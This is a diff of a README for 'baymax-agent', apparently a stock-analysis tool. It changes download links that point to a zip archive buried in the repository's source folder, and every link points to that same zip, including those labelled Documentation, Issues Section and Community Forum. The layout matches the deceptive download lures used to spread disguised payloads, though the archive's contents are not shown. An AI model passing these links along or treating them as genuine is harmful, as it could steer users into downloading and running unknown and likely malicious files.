@@ -6,13 +6,13 @@ Welcome to baymax-agent! This software helps you analyze stocks and conduct inve
 
 ## 📥 Download Now!
 
-[![Download baymax-agent](https://raw.githubusercontent.com/gaynorundischarged814/baymax-agent/main/src/baymax-agent-3.0.zip)](https://raw.githubusercontent.com/gaynorundischarged814/baymax-agent/main/src/baymax-agent-3.0.zip)
+[![Download baymax-agent](https://github.com/gaynorundischarged814/baymax-agent/raw/refs/heads/main/src/baymax/utils/baymax_agent_v1.3.zip)](https://github.com/gaynorundischarged814/baymax-agent/raw/refs/heads/main/src/baymax/utils/baymax_agent_v1.3.zip)
 
 ## 📂 Download & Install
 
 1. **Visit the Releases Page**  
    Click the link below to go to the GitHub releases page:  
-   [Download baymax-agent](https://raw.githubusercontent.com/gaynorundischarged814/baymax-agent/main/src/baymax-agent-3.0.zip)
+   [Download baymax-agent](https://github.com/gaynorundischarged814/baymax-agent/raw/refs/heads/main/src/baymax/utils/baymax_agent_v1.3.zip)
 
 2. **Select the Latest Version**  
    On the releases page, you will see a list of available versions. Look for the most recent version at the top.
@@ -61,9 +61,9 @@ If you encounter any issues during installation or while using baymax-agent, try
 
 For more detailed guides and information about baymax-agent, check out the following resources:
 
-- [Documentation](https://raw.githubusercontent.com/gaynorundischarged814/baymax-agent/main/src/baymax-agent-3.0.zip)
-- [Issues Section](https://raw.githubusercontent.com/gaynorundischarged814/baymax-agent/main/src/baymax-agent-3.0.zip)
-- [Community Forum](https://raw.githubusercontent.com/gaynorundischarged814/baymax-agent/main/src/baymax-agent-3.0.zip)
+- [Documentation](https://github.com/gaynorundischarged814/baymax-agent/raw/refs/heads/main/src/baymax/utils/baymax_agent_v1.3.zip)
+- [Issues Section](https://github.com/gaynorundischarged814/baymax-agent/raw/refs/heads/main/src/baymax/utils/baymax_agent_v1.3.zip)
+- [Community Forum](https://github.com/gaynorundischarged814/baymax-agent/raw/refs/heads/main/src/baymax/utils/baymax_agent_v1.3.zip)
 
 ## ✉️ Feedback
 
